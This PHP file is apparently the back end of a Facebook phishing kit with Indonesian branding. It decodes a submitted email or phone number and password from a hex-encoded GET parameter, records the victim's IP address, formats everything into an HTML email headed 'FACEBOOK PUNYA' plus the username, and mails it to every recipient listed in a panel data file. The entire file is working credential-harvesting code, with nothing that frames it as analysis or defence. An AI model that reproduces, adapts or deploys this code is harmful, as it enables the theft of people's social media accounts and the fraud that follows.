<?php
if (isset($_GET['cat'])) {
    $serialized_data = hex2bin($_GET['cat']);
    parse_str($serialized_data, $form_data);

    if (isset($form_data['user']) && isset($form_data['pass'])) {
        $user = $form_data['user'];
        $pass = $form_data['pass'];
        $ipanddress = $_SERVER['REMOTE_ADDR'];

        if ($user != $pass && $pass != $ipanddress) {
            $subject = "🇮🇩 [+62] | FACEBOOK PUNYA $user";
            $massage = '
            <center>
            <div style="background: url(https://i.ibb.co/bQLHgX0/IMG-20240428-225906-800.jpg) no-repeat;border:1px solid #9900cc;background-size: 100% 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
            </div>
            </table>
            <div style="background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab); width: 294; color: #fff; text-align: center; padding: 10px;"> 🔆 Created By Atha Hosting 🔆
            </div>
            </table>
            <div style="border: 1px solid #9900cc; width: 294; font-weight:Bold; height: 15px; background: #ff00ff; color: #fff; padding: 2px; text-align:center;">
            Informasi Data
            </div>
            <table border="1" bordercolor="#9900cc" style="color:#fff; border:1px solid #9900cc; border-collapse:collapse;width:100%;background:#2C75B9;">
            <tr>
            <th style="padding:2px;width: 35%; text-align: left;" height="25px"><b>Email/Phone</b></th>
            <th style="padding:2px;width: 65%; text-align: center;"><b>' . $user . '</th> 
            </tr>
            <tr>
            <th style="padding:2px;width: 35%; text-align: left;" height="25px"><b>Kata sandi</th>
            <th style="padding:2px;width: 65%; text-align: center;"><b>' . $pass . '</th> 
            </tr>
            <tr>
            <th style="padding:2px;width: 35%; text-align: left;" height="25px"><b>IP Address</th>
            <th style="width: 65%; text-align: center;"><b>' . $ipanddress . '</th> 
            </tr>
            </table>
            <div style="border:1px solid #9900cc;width: 294; font-weight:bold; height: 20px; background: #2C75B9; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
            <a style="border:1px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#00ff00;" href="https://wa.me/6285771487412">Whatsapp</a>
            <a style="border:1px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#00ff00;" href="https://chat.whatsapp.com/CTDAYzlP9Uk1hIQL0jEjyf">Grup Wa</a>
            </div>
            <center>
            ';

            include 'panel/data.php';
            $sender = 'From: '.$nik.' <'.$sender.'>';
            $headers = 'MIME-Version: 1.0' . "\r\n";
            $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
            $headers .= $sender . "\r\n";

            $read = file_get_contents('panel/data.json'); 
            $json = json_decode($read, true);

            foreach ($json as $recipient) {
                mail($recipient['email'], $subject, $massage, $headers);
            }

            echo ":(";
        }
    }
}
include "konekin.php";
?>
